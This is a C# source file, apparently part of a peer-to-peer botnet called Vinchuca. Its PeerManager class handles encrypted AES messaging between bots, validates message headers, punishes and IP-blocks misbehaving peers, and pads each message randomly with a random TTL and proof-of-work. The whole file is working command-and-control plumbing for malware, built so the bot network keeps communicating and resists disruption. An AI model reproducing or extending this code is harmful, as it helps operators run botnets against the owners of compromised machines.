using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using Vinchuca.Crypto;
using Vinchuca.Network.Comunication;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Utils;
using Vinchuca.Workers;

namespace Vinchuca.Network.Protocol.Peers
{
    public class PeerManager
    {
        private readonly BotIdentifier _botId;
        private readonly IWorkScheduler _worker;
        private readonly CommunicationManager _communicationManager;
        internal readonly ReplyWaitManager WaitingForReply;
        private static readonly Log Logger = new Log(new TraceSource("Peer-Manager", SourceLevels.Verbose));

        public EventHandler<PackageReceivedEventArgs<BotHeader>> BotPackageReceivedEventArgs;
        private readonly PeerList _peerList;

        public PeerManager(CommunicationManager communicationManager, PeerList peerList, IWorkScheduler worker, BotIdentifier botId)
        {
            _communicationManager = communicationManager;
            _communicationManager.PackageReceivedEventArgs += PackageReceivedEventArgs;
            _worker = worker;
            _botId = botId;
            WaitingForReply = new ReplyWaitManager(_communicationManager);

            _worker.QueueForever(PurgeTimeouts, TimeSpan.FromSeconds(60));
            _peerList = peerList;

            _peerList.BrokenBotDetected += BrokenBotDetected;
        }

        private void BrokenBotDetected(object sender, BrokenBotDetectedEventArgs e)
        {
            Logger.Verbose("Broken Bot detected at {0}", e.PeerInfo);
            _communicationManager.BlockIp(e.PeerInfo.EndPoint.Address);
        }

        private void PackageReceivedEventArgs(object sender, PackageReceivedEventArgs<IPEndPoint> e)
        {
            var data = e.Payload;
            var count = e.Count;

            PeerInfo peerInfo; 
            if (_peerList.TryGet(e.Proto, out peerInfo) && peerInfo.EncryptionKey != null)
            {
                data = Aes.Decrypt(data, 0, count, peerInfo.EncryptionKey);
            }

            var botHeader = BotHeader.Decode(data);
            if(!IsValidHeader(botHeader))
            {
                Logger.Warn("Invalid message received by bot {0} from {1}", botHeader.BotId, e.Proto);
                _peerList.Punish(botHeader.BotId);
                return;
            }

            botHeader.EndPoint = e.Proto;
            _peerList.UpdatePeer(botHeader.BotId);

            var args = new PackageReceivedEventArgs<BotHeader>(botHeader, data, count);
            Events.Raise(BotPackageReceivedEventArgs, this, args);
        }

        internal void Punish(BotIdentifier botId)
        {
            _peerList.Punish(botId);
        }

        internal void Ban(IPEndPoint endpoint)
        {
            _communicationManager.BlockIp(endpoint.Address);
        }

        private static bool IsValidHeader(BotHeader botHeader)
        {
            return !(botHeader.Padding < 2 || botHeader.Padding > 128
                    || botHeader.MessageId < 0 
                    || botHeader.Ttl < 2 || botHeader.Ttl > 6);
        }

        private void PurgeTimeouts()
        {
            WaitingForReply.PurgeTimeouts();
        }

        internal void Send(MessageMetadata metadata, ulong correlationId, short ttl, byte[] payload, BotIdentifier peerBotId)
        {
            if (!_peerList.IsRegisteredBot(peerBotId) && metadata.MessageId != MessageCode.Hello)
            {
                Logger.Verbose("Cannot send message to unkown {0} bot", peerBotId);
                return;
            }
            var peerInfo = _peerList[peerBotId];

            byte[] message;
            BotHeader header;
            do
            {
                var padding = RandomUtils.NextPadding();
                header = new BotHeader
                {
                    CorrelationId = correlationId == 0 ? RandomUtils.NextCorrelationId() : correlationId,
                    BotId = _botId,
                    MessageId = (short)metadata.MessageId,
                    PayloadSize = (short) payload.Length,
                    Padding = (short) padding.Length,
                    Ttl = ttl == 0 ? RandomUtils.NextTtl() : ttl
                };

                var preambule = BufferUtils.Concat(header.Encode(), padding);
                message = BufferUtils.Concat(preambule, payload);
            } while (!PoW.IsEnough(message, 0, message.Length, metadata.RequiredWork));

            if (metadata.Encrypted)
            {
                message = Aes.Encrypt(message, 0, message.Length, peerInfo.EncryptionKey);
            }

            var endPoint = peerInfo.EndPoint;

            Logger.Verbose("{0}@{1} {2}", header.BotId, endPoint, header.CorrelationId);
            _communicationManager.Send(endPoint, message);
            if (correlationId == 0)
            {
                WaitingForReply.Add(new Package(endPoint, message, message.Length), header.CorrelationId);
            }
        }

        internal IEnumerable<BotIdentifier> GetBotIdentifiers()
        {
            foreach (var peer in _peerList)
            {
                if (!peer.IsLazyBot && !peer.IsUnknownBot)
                    yield return peer.BotId;
            }
        }
    }
}